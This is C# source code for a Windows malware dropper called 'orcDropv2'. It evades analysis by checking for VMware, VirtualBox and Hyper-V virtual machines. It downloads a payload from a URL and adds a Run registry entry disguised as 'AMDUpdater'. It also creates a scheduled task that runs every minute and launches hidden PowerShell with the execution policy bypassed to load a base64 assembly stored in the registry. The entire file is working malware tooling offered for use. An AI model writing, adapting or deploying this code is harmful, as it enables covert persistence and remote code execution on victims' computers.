using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace orcDropv2
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Obfuscate.ObfuscateSourceCode();

            if (IsRunningInVirtualMachine())
            {
                // Do nothing
            }
            else
            {
                // Not running in VM
                string Payload = DownloadMalware("https://127.0.0.1/Payload.exe");
                AddPayloadToRegistry();
                AddToSchtasks();
            }
    

        }

        private static string DownloadMalware(string url)
        {
            using (WebClient wc = new WebClient())
            {
                return wc.DownloadString(url);
            }
            
        }

        private static void AddPayloadToRegistry()
        {
            // Get the current user's registry hive
            RegistryKey registryKey = Registry.CurrentUser;

            // Open the desired registry path
            RegistryKey subKey = registryKey.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);

            // Add your payload to the registry
            subKey.SetValue("AMDUpdater", "C:\\Windows\\amdupdater.exe");

            subKey.Close();
            registryKey.Close();
        }

        //AddToSchtasks method taken from NYAN-CAT's dropper
        private static void AddToSchtasks()
        {
            string PS = @"powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -NoExit -Command [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String((Get-ItemProperty HKCU:\Software\Dropless-Malware\).Payload)).EntryPoint.Invoke($Null,$Null)";
            Process.Start(new ProcessStartInfo()
            {
                FileName = "schtasks",
                Arguments = "/create /sc minute /mo 1 /tn LimeLoader /tr " + "\"" + PS + "\"",
                CreateNoWindow = true,
                ErrorDialog = false,
                WindowStyle = ProcessWindowStyle.Hidden
            });

        }

        public static bool IsRunningInVirtualMachine()
        {
            bool isVirtualMachine = false;
            try
            {
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        string manufacturer = obj["Manufacturer"].ToString().ToLower();
                        if ((manufacturer == "microsoft corporation" && obj["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
                            || manufacturer.Contains("vmware")
                            || obj["Model"].ToString() == "VirtualBox")
                        {
                            isVirtualMachine = true;
                            break;
                        }
                    }
                }
            }
            catch (Exception)
            {
                // Error
            }

            return isVirtualMachine;
        }
    }
}